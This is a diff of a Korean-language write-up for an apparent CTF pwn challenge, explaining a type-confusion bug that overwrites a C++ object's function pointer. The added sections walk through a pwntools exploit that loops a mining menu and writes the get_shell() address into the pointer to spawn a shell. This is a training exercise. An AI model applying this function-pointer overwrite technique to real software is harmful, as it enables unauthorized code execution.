@@ -76,7 +76,7 @@ class UndiscoveredMineral : public Mineral {
 }
 
 class RareEarth : public Mineral {
-    DESC_FUNC description; // 함수 포인터 (예: print_cerium_description 등)
+    DESC_FUNC description; // 함수 포인터 
 }
 ```
 
@@ -103,6 +103,7 @@ void edit_mineral_book() {
 * 무작정 UndiscoveredMineral*로 강제로 바꿔서 함수 포인터가 저장된 영역에 문자열을 덮어버림.
 
 **구조체를 잘못 해석해서 함수 포인터에 내가 입력한 문자열이 들어가버리는 것이 핵심 취약점**
+
 → **그 결과 함수 포인터(RareEarth::description)를 원하는 주소로 임의로 조작 가능**
 
 
@@ -120,7 +121,7 @@ void RareEarth::print_description() const {
 * print_description()이 호출될 때 description()이 실행됨
 * 그런데 그 description은 함수 포인터였고 지금은 덮어쓴 주소임
 
-→ 쉘 따기 가능 (get_shell() 주소로 덮어서)
+→ **쉘 따기 가능 (get_shell() 주소로 덮어서)**
 
 
 
@@ -141,7 +142,17 @@ void RareEarth::print_description() const {
 
 
 
-## 익스플로잇 코드
+## 익스플로잇 과정
+
+일단 ida로 바이너리 열어서 get_shell 주소부터 구한다.
+
+<img width="426" height="298" alt="image" src="https://github.com/user-attachments/assets/c37340a4-deb1-4b4f-a031-c6561c8e0dd6" />
+
+"/bin/sh" 사용하는 함수로 역으로 추적하면 찾을 수 있다.
+
+익스플로잇 코드를 작성한다.
+
+
 
 ```python
 from pwn import *
@@ -181,9 +192,88 @@ while True:
             p.interactive()
 ```
 
+* rare-earth가 등장할 때까지 무한 루프를 돌며 mining을 반복
+* 발견되면 바로 edit 메뉴로 진입해서 해당 인덱스를 덮어씀
+* payload는 정확히 8바이트 (p64(getsh_addr))로 DESC_FUNC에 정확히 맞게 들어가야 함
+* p.interactive()로 쉘을 유지
+
+---------------------------------------
+
+```python
+getsh_addr = 0x402576  # get_shell 함수 주소
+payload = p64(getsh_addr)  # 리틀엔디언으로 주소 인코딩
+
+idx = 0  # 현재 광물의 인덱스 (vector<Mineral*>에 쌓이는 순서)
+```
+
+--------------------
+
+### 반복적으로 mining 시도
+
+```
+while(1):
+    print(idx)
+    p.recvuntil('>> ')
+    p.sendline("1")  # mining
+    p.recvline()
+    sleep(1.1)
+    a = p.recvline()
+    print('output : ' + a)
+```
+* mining() 호출 (1번 메뉴)
+* a는 mining 결과 메시지.
+
+--------------
+
+### 발견된 광물에 따른 분기 처리
+
+```python
+if(a == "[+] Congratulations! you found an *undiscovered* mineral!\n"):
+    print('mineral')
+    p.recvuntil("Please enter mineral's description : ")
+    p.sendline("aaaa")  # 그냥 dummy
+    idx+=1
+```
+
+평범한 광물 발견 시: UndiscoveredMineral → idx 증가
+
+
+```python
+else:
+    print('rare-earth')
+    ...
+    p.sendline('3')  # 메뉴 3: edit_mineral_book
+    ...
+    p.sendline(str(idx))  # 방금 얻은 rare-earth의 인덱스를 넘김
+    ...
+    p.send(payload)  # 함수 포인터 자리에 get_shell 주소 덮어쓰기
+    p.interactive()  # 쉘 진입
+
+```
+
+* rare-earth 발견 시 → 바로 함수 포인터 덮기
+* edit_mineral_book()을 통해 rare-earth 객체를 UndiscoveredMineral*로 캐스팅
+* strncpy()로 함수 포인터에 get_shell() 주소를 덮어씌움
+
+--------------
+
+### 쉘 실행 트리거
+
+```python
+void print_description() const override 
+{
+    if ( description )
+        description();  // 덮은 get_shell 주소 호출됨
+}
+```
+
+덮은 후 RareEarth::print_description()이 실행되면, 내부적으로 description()이 호출되며 덮어쓴 함수 주소가 호출 
+
+→ get_shell() 실행!
 
 
 
+## 플래그 출력
 
 <img width="437" height="178" alt="image" src="https://github.com/user-attachments/assets/d12fac32-d724-4d1a-ac18-68f0b88ca22b" />
 
